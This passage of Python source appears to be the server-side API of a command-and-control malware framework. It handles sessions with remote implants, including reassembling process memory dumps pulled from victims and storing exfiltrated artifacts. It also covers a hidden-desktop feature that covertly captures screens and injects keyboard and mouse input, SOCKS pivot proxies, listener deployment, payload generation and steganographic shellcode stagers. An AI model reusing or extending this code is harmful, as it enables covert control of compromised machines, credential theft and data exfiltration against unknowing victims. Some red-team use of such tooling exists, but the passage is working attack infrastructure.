        byte[] data = br.ReadBytes(br.ReadInt32());
		"""

		#print "[ENTERED] __rebuild_procdump_result_message; comms_msg length = %u, comms_msg = %s" % (len(comms_msg), comms_msg[:100] + ("..." if len(comms_msg) > 100 else ""))

		if not self.__is_protocol_msg_type(comms_msg, ECommsProtocolMessageType.CPMT_PROCDUMP):
			return

		comms_msg = b64decode(comms_msg)
		
		#print "[__process_hidden_desktop_message] client id is %s" % (client_id)

		success = struct.unpack("<B", comms_msg[48:49])[0]

		if not success:
			# let this get reported back to UI
			return

		dump_id = str(uuid.UUID(bytes=bytes(bytearray(struct.unpack("<16B", comms_msg[49:65]))))).lower()
		if not dump_id:
			return

		offset = struct.unpack("<I", comms_msg[69:73])[0]
		total = struct.unpack("<I", comms_msg[73:77])[0]
		chunk_size = struct.unpack("<I", comms_msg[77:81])[0]

		dump_path = ApiManager.__TEMP_PATH + dump_id + ".dmp"
		
		dump_complete = False

		with open(dump_path, "r+b") as f:
			#print "__rebuild_procdump_result_message; reading in chunk of size %u at offset %u" % (chunk_size, offset)
			f.seek(offset)
			chunk_data = f.read(chunk_size)
			comms_msg += chunk_data
			dump_complete = (offset + len(chunk_data) >= total)

		if dump_complete:
			h = hashlib.sha1()
			
			with open(dump_path, "rb") as f:
				while True:
					data = f.read(10 * 1024 * 1024)
					if not data:
						break
					h.update(data)

			sha1hash = h.hexdigest().lower()
			artifact_path = ApiManager.__ARTIFACT_PATH + sha1hash + ".bin"
			
			#print "__rebuild_procdump_result_message; dump complete, moving to %s" % (artifact_path)

			shutil.move(dump_path, artifact_path)
		
		return b64encode(comms_msg)

	def session_getresult(self, msg_id):
		with self._lock_queued_results:
			if msg_id not in self.__queued_results:
				return

			matches = self.__queued_results[msg_id]
			if not matches:
				return
			
			qc = matches[0] # first chonologically if multiple matches

			self.__queued_results[msg_id].remove(qc)
		
		if self.__is_protocol_msg_type(qc.Result, ECommsProtocolMessageType.CPMT_PROCDUMP):
			# read procdump chunk from file
			return self.__rebuild_procdump_result_message(qc.Result)

		return qc.Result
	
	def session_getresult_batch(self, msg_ids):
		msgs = []
		for msg_id in msg_ids:
			msg = self.session_getresult(msg_id)
			if msg:
				msgs.append(msg)
		return msgs

	def session_listbroadcastresults(self):
		expiration = datetime.now() + timedelta(seconds=30)
		while datetime.now() < expiration:
			with self._lock_queued_broadcast_results:
				for item in self.__queued_broadcast_results:
					if item[0] + timedelta(minutes=15) < datetime.now():
						self.__queued_broadcast_results.remove(item)
		
			with self._lock_queued_broadcast_results:
				r = list(set(map(lambda bm : bm[1].MessageId, self.__queued_broadcast_results)))
				if r:
					return r
			time.sleep(0.1)
		return []

	def session_getbroadcastresult(self, msg_id):
		with self._lock_queued_broadcast_results:
			matches = filter(lambda bm : bm[1].MessageId == msg_id, self.__queued_broadcast_results)
		if not matches:
			return
		
		qc = matches[-1][1] # most recent if conflict
		
		return qc.Result
	
	def session_getlastactivity(self):
		with self._lock_client_activity:
			lastactivity = map(lambda ca : {
					"clientid": ca.ClientId,
					"timestamp": datetime.isoformat(ca.TimeStamp),
					"ip": ca.IP,
					"detailedinfo": ca.DetailedInfo,
					"listener_name": ca.ListenerName
				}, self.__client_activity)
			#from pprint import pprint
			#pprint(lastactivity)
			return lastactivity
	
	def session_adddetailedinfo(self, client_id, detailedinfo):
		with self._lock_client_activity:
			matches = filter(lambda ca : ca.ClientId == client_id, self.__client_activity)
		if not matches:
			return
		
		ca = matches[-1] # most recent if conflict
		ca.DetailedInfo = detailedinfo

		return True
	
	def session_log_command_issuer(self, msg_id, issuer):
		self.__db.add_command_issuer(msg_id, issuer)
		return True

	def session_log_command_extra_data(self, msg_id, extra_data_type, extra_data):
		self.__db.add_command_extra_data(msg_id, extra_data_type, extra_data)
		return True

	def session_log_client_extra_data(self, client_id, extra_data_type, extra_data):
		self.__db.add_client_extra_data(client_id, extra_data_type, extra_data)
		return True
	
	def session_addconsoledelta(self, client_id, delta_info):
		delta_id = delta_info["delta_id"]
		type = delta_info["delta_type"]
		data = delta_info["delta_data"]
		#timestamp = datetime.strptime(delta_info["timestamp"], "%Y-%m-%d %H:%M:%S.%f")
		timestamp = datetime.utcnow()

		if not delta_id or not type or not data:
				return

		with self._lock_console_delta:
			delta = ConsoleDelta(timestamp, client_id, delta_id, type, data)
			self.__console_delta_map.setdefault(client_id,[]).append(delta)
			self.__db.add_console_delta(delta)

		return True

	def session_getconsoledelta(self, client_id, delta_id):
		with self._lock_console_delta:
			if client_id in self.__console_delta_map:
				deltas = filter(lambda x : x.DeltaId == delta_id, self.__console_delta_map[client_id])
				if not deltas:
					return
				
				return {
					"client_id": deltas[0].ClientId,
					"delta_id": deltas[0].DeltaId,
					"timestamp": datetime.isoformat(deltas[0].TimeStampUtc),
					"delta_type": deltas[0].DeltaType,
					"delta_data": deltas[0].DeltaData
					}
		return

	def session_getconsoledelta_batch(self, client_id, delta_ids):
		deltas = []
		for delta_id in delta_ids:
			delta = self.session_getconsoledelta(client_id, delta_id)
			if delta:
				deltas.append(delta)
		return deltas

	def session_listconsoledelta(self, client_id, timestamp):
		expiration = datetime.now() + timedelta(seconds=30)
		while datetime.now() < expiration:
			with self._lock_console_delta:
				if client_id in self.__console_delta_map:
					if timestamp == "all":
						last_timestamp = datetime(0, 0, 0)
					else:
						last_timestamp = datetime.strptime(b64decode(timestamp), "%Y-%m-%d %H:%M:%S.%f")
					#print "[listconsoledelta] [%s] Asking for deltas since: %s" % (client_id, repr(last_timestamp))
					r = map(lambda x : x.DeltaId, filter(lambda y : y.TimeStampUtc > last_timestamp, self.__console_delta_map[client_id]))
					if r:
						return r
			time.sleep(0.1)
		return []

	def session_storeartifact(self, client_id, sha1hash, type, issuer, name, description, payload, payload_size):
		if payload:
			h = hashlib.sha1(payload)
			sha1hash = h.hexdigest().lower()
			
			payload_size = len(payload)
			
			artifact_path = ApiManager.__ARTIFACT_PATH + sha1hash + ".bin"
			
			with open(artifact_path, "wb") as f:
				f.write(payload)

		if not sha1hash:
			return False

		self.__db.store_artifact(client_id, type, issuer, name, str(payload_size), description, sha1hash)
		return True

	def session_artifactexists(self, sha1hash):
		return self.__db.get_artifact(sha1hash) != None

	def session_listartifacts(self):
		return self.__db.list_artifacts()
	
	def session_downloadartifact(self, sha1hash):
		artifact = self.__db.get_artifact(sha1hash)
		if not artifact:
			return

		filename = artifact["name"].replace("\\", "/").split("/")[-1]

		artifact_path = ApiManager.__ARTIFACT_PATH + sha1hash + ".bin"

		if not os.path.exists(artifact_path):
			return

		with open(artifact_path, "rb") as f:
			payload = f.read()

		return payload,filename


	def __push_hiddendesktop_command(self, client_id, hd_input):
		serialized_input = struct.pack("<I", hd_input.CommandType)

		if hd_input.CommandType == EHiddenDesktopCommandType.START:
			serialized_input += struct.pack("<I", len(hd_input.DesktopName))
			serialized_input += str(hd_input.DesktopName)
		elif hd_input.CommandType == EHiddenDesktopCommandType.STOP:
			pass
		elif hd_input.CommandType == EHiddenDesktopCommandType.STATUS:
			pass
		elif hd_input.CommandType == EHiddenDesktopCommandType.CAPTURE:
			cap_params = HiddenDesktopCaptureParams()
			with self._lock_hd_last_captures:
				if client_id in self.__hd_capture_params:
					cap_params = self.__hd_capture_params[client_id]
			serialized_input += struct.pack("<I", cap_params.CaptureChunkSize)
			serialized_input += struct.pack("<I", cap_params.CaptureQuality)
		elif hd_input.CommandType == EHiddenDesktopCommandType.INPUT:
			serialized_input += struct.pack("<I", len(hd_input.InputType))
			serialized_input += str(hd_input.InputType)
			serialized_input += struct.pack("<I", len(hd_input.InputKey))
			serialized_input += str(hd_input.InputKey)
			serialized_input += struct.pack("<I", hd_input.X)
			serialized_input += struct.pack("<I", hd_input.Y)
		
		message_id = uuid.uuid4()

		payload = uuid.UUID(client_id).bytes										# ClientId
		payload += message_id.bytes													# MessageId
		payload += struct.pack("<Q", convert_to_file_time(datetime.now()))			# DateTime
		payload += struct.pack("<I", ECommsProtocolMessageType.CPMT_HIDDEN_DESKTOP)	# Type
		payload += struct.pack("<I", len(serialized_input))							# Length
		payload += serialized_input													# Buffer

		#print "[__push_hiddendesktop_command] payload length = %u, payload = %s" % (len(payload), b64encode(payload))

		return self.session_putcommand(str(client_id).lower(), str(message_id).lower(), b64encode(payload))
	
	def session_hiddendesktop_start(self, client_id, desktop_name):
		# queue command to start hidden desktop
		return (self.__push_hiddendesktop_command(client_id, HiddenDesktopInput(EHiddenDesktopCommandType.START, desktop_name)) and
				self.__push_hiddendesktop_command(client_id, HiddenDesktopInput(EHiddenDesktopCommandType.STATUS)))

	def session_hiddendesktop_stop(self, client_id):
		# queue command to stop hidden desktop
		return self.__push_hiddendesktop_command(client_id, HiddenDesktopInput(EHiddenDesktopCommandType.STOP))
	
	def session_hiddendesktop_status(self, client_id):
		is_active = False
		desktop_name = ""
		capture_image = None
		capture_timestamp = None

		with self._lock_hd_last_captures:
			if client_id in self.__hd_last_captures:
				#print "[psession_hiddendesktop_status] client id %s IS in last captures" % (client_id)
				
				last_cap = self.__hd_last_captures[client_id]
				is_active = last_cap.IsActive
				desktop_name = last_cap.DesktopName
				capture_timestamp = last_cap.TimestampUtc

				#print "[session_hiddendesktop_status] is_active = %s, desktop_name = %s, capture_image length = %u, timestamp = %s" % (
				#	str(is_active), desktop_name, len(capture_image) if capture_image else 0,
				#	str(capture_timestamp) if capture_timestamp else "")
			#else:
			#	print "[session_hiddendesktop_status] client id %s is NOT in last captures" % (client_id)

		self.__push_hiddendesktop_command(client_id, HiddenDesktopInput(EHiddenDesktopCommandType.STATUS))

		return { "is_active": str(is_active), "desktop_name": str(desktop_name), "capture_timestamp": datetime.isoformat(capture_timestamp) if capture_timestamp else None }
	
	def session_hiddendesktop_capture(self, client_id):
		# return last capture as an image
		is_active = False
		desktop_name = ""
		capture_image = None
		capture_timestamp = None

		#print "[session_hiddendesktop_capture] client id %s" % (client_id)

		with self._lock_hd_last_captures:
			if client_id not in self.__hd_last_captures:
				#print "[session_hiddendesktop_capture] client id is NOT in last captures"
				# if there is no saved capture for this client_id then ask for the first one
				if not self.__push_hiddendesktop_command(client_id, HiddenDesktopInput(EHiddenDesktopCommandType.CAPTURE)):
					return
			else:
				last_cap = self.__hd_last_captures[client_id]
				is_active = last_cap.IsActive
				desktop_name = last_cap.DesktopName
				capture_image = last_cap.CaptureImage
				capture_timestamp = last_cap.TimestampUtc
				#print "[session_hiddendesktop_capture] is_active = %s, desktop_name = %s, capture_image length = %u, timestamp = %s" % (
				#	str(is_active), desktop_name, len(capture_image) if capture_image else 0,
				#	str(capture_timestamp) if capture_timestamp else "")

		return {
			"is_active": str(is_active),
			"desktop_name": str(desktop_name),
			"capture_image": b64encode(capture_image) if capture_image else None,
			"capture_timestamp": datetime.isoformat(capture_timestamp) if capture_timestamp else None
			}
	
	def session_hiddendesktop_capturewait(self, client_id, timestamp):
		expiration = datetime.now() + timedelta(seconds=30)
		while datetime.now() < expiration:
			with self._lock_hd_last_captures:
				if client_id in self.__hd_last_captures:
					if timestamp == "all":
						last_timestamp = datetime(0, 0, 0)
					else:
						last_timestamp = datetime.strptime(b64decode(timestamp), "%Y-%m-%d %H:%M:%S.%f")

					last_cap = self.__hd_last_captures[client_id]
					if last_cap.TimestampUtc > last_timestamp:
						return True
			time.sleep(0.1)
		return
	
	def session_hiddendesktop_input(self, client_id, input_type, input_key, coord_x, coord_y):
		# queue command to interact with hidden desktop
		return self.__push_hiddendesktop_command(client_id, HiddenDesktopInput(EHiddenDesktopCommandType.INPUT, input_type=input_type, input_key=input_key, coord_x = coord_x, coord_y=coord_y))

	def session_hiddendesktop_setcaptureparams(self, client_id, chunk_size, quality):
		with self._lock_hd_last_captures:
			cap_params = self.__hd_capture_params.setdefault(client_id, HiddenDesktopCaptureParams())
			if chunk_size and int(chunk_size) != 0:
				#print "[session_hiddendesktop_setcaptureparams] updating chunk size to %u" % (chunk_size)
				cap_params.CaptureChunkSize = int(chunk_size)
			
			if quality and int(quality) != 0:
				#print "[session_hiddendesktop_setcaptureparams] updating quality to %u%%" % (quality)
				cap_params.CaptureQuality = int(quality)
		return True
	
	def session_get_p2p_mesh(self):
		with self._lock_peer_mesh:
			return copy(self.__peer_mesh)
		return

	def session_start_socks(self, client_id, port):
		with self._lock_client_socks_handlers:
			if client_id not in self.__client_socks_handlers:
				daemon = sockshandler.C2SocksDaemon(client_id, port)
				if not daemon.serve():
					return {"error": "Unable to listen on port %u." % port}
				self.__client_socks_handlers[client_id] = daemon
				return {"result": "Listening on port %u." % self.__client_socks_handlers[client_id].get_port()}
			return {"result": "Proxy already listening on port %u." % self.__client_socks_handlers[client_id].get_port()}
	
	def session_stop_socks(self, client_id):
		with self._lock_client_socks_handlers:
			if client_id == "all":
				for daemon in self.__client_socks_handlers.itervalues():
					daemon.shutdown()
				self.__client_socks_handlers = {}
				return {"result": "All proxies stopped."}
			elif client_id in self.__client_socks_handlers:
				daemon = self.__client_socks_handlers[client_id]
				daemon.shutdown()
				del self.__client_socks_handlers[client_id]
				return {"result": "Proxy on port %u stopped." % daemon.get_port()}	
			return {"result": "Proxy not started."}
	
# used by routes in controlresources
	
	def control_checkauth(self, username, password):
		return self.__db.check_auth(username, password)
	
	def control_adduser(self, username, password):
		self.setup_user(username, password)
		return True

	def control_check_secret(self, listener_name, secret):
		with self._lock_deployed_c2s:
			listeners = filter(lambda x : x.ListenerName == listener_name and x.Secret == secret, self.__deployed_c2s)
		if listeners:
			return True
		return

	def control_getlisteners(self):
		with self._lock_deployed_c2s:
			if not self.__deployed_c2s:
				return

		with self._lock_deployed_c2s:
			listeners = map(lambda x : x.ListenerName, self.__deployed_c2s)
		return listeners

	def control_getlistenerprofile(self, listener_name):
		with self._lock_deployed_c2s:
			matches = filter(lambda di : di.ListenerName == listener_name, self.__deployed_c2s)
		if matches:
			return matches[0].Profile
		return
	
	def control_getagentprofile(self, listener_name, uri, type, proxy_uri):
		import agent_config
		with self._lock_deployed_c2s:
			matches = filter(lambda di : di.ListenerName == listener_name, self.__deployed_c2s)
		if matches:
			server_profile = matches[0].Profile
			agent_profile = agent_config.create(server_profile, type, uri, proxy_uri)
			return agent_profile
		return

	def __add_listener_name_to_profile(self, listener_name, profile):
		profile["c2-profile"]["listener-name"] = listener_name
		return

	def control_deployc2(self, listener_name, secret, profile, is_restore = False):
		from deployc2 import DeployedC2Instance, DEPLOYED_C2_STATUS
		
		with self._lock_deployed_c2s:
			matches = filter(lambda di : di.ListenerName == listener_name, self.__deployed_c2s)
		if matches:
			return
		
		# replace std::regex compatible wildcard with normal wildcard
		profile_str = json.dumps(profile)
		profile_str = profile_str.replace("[^]", ".")
		profile = json.loads(profile_str)

		self.__add_listener_name_to_profile(listener_name, profile)

		deployed_inst = DeployedC2Instance.create(listener_name, secret, profile)
		
		with self._lock_deployed_c2s:
			if deployed_inst.status() == DEPLOYED_C2_STATUS.RUNNING:
				self.__deployed_c2s.append(deployed_inst)
				if not is_restore:
					self.__db.add_c2(database.ServerType.DEPLOYED, deployed_inst)
		
		return deployed_inst.status()
	
	def control_adoptc2(self, listener_name, secret, profile, is_restore = False):
		from deployc2 import DeployedC2Instance, DEPLOYED_C2_STATUS
		
		with self._lock_deployed_c2s:
			matches = filter(lambda di : di.ListenerName == listener_name, self.__deployed_c2s)
		if matches:
			return
		
		self.__add_listener_name_to_profile(listener_name, profile)
		
		adopted_inst = DeployedC2Instance.adopt(listener_name, secret, profile)
		
		with self._lock_deployed_c2s:
			if adopted_inst.status() == DEPLOYED_C2_STATUS.RUNNING:
				self.__deployed_c2s.append(adopted_inst)
				if not is_restore:
					self.__db.add_c2(database.ServerType.ADOPTED, adopted_inst)
		
		return adopted_inst.status()
	
	def control_teardownc2(self, listener_name):
		with self._lock_deployed_c2s:
			matches = filter(lambda di : di.ListenerName == listener_name, self.__deployed_c2s)
		
		if matches:
			with self._lock_deployed_c2s:
				for deployed_inst in matches:
					deployed_inst.teardown()
					self.__deployed_c2s.remove(deployed_inst)
					self.__db.remove_c2(deployed_inst)
			return True

		return False
	
	def control_teardownallc2(self):
		with self._lock_deployed_c2s:
			for deployed_inst in self.__deployed_c2s:
				deployed_inst.teardown()
				self.__db.remove_c2(deployed_inst)
		
		with self._lock_deployed_c2s:
			self.__deployed_c2s = []
		return True
	
	def control_payload_gen(self, listener_name, payload_params):
		from payload_gen import PayloadGenerator
		
		with self._lock_deployed_c2s:
			matches = filter(lambda di : di.ListenerName == listener_name, self.__deployed_c2s)
		if not matches:
			return
		
		deployed_inst = matches[0]

		return PayloadGenerator.create(deployed_inst, payload_params)
	
	def control_payload_gen_from_agentprofile(self, listener_name, agent_profile, payload_params):
		from payload_gen import PayloadGenerator
		
		with self._lock_deployed_c2s:
			matches = filter(lambda di : di.ListenerName == listener_name, self.__deployed_c2s)
		if not matches:
			return
		
		return PayloadGenerator.create_from_agentprofile(listener_name, agent_profile, payload_params)
	
	def control_getaction(self, listener_name):
		with self._lock_pending_control_actions:
			matches = filter(lambda qa : qa.ListenerName == listener_name, self.__pending_control_actions)
		if not matches:
			return
		
		qa = matches[-1] # most recent if conflict
		
		with self._lock_pending_control_actions:
			for item in matches:
				self.__pending_control_actions.remove(item)
		
		return qa.Action
	
	def control_putaction(self, listener_name, action):
		with self._lock_pending_control_actions:
			self.__pending_control_actions.append(QueuedAction(listener_name, action))
		return True

	def control_stego_stager_gen(self, stager_request):
		from stego_stager_gen import StegoStagerGen
		return StegoStagerGen.create(stager_request["shellcode_info"], stager_request["image_info"], stager_request["stego_profile"])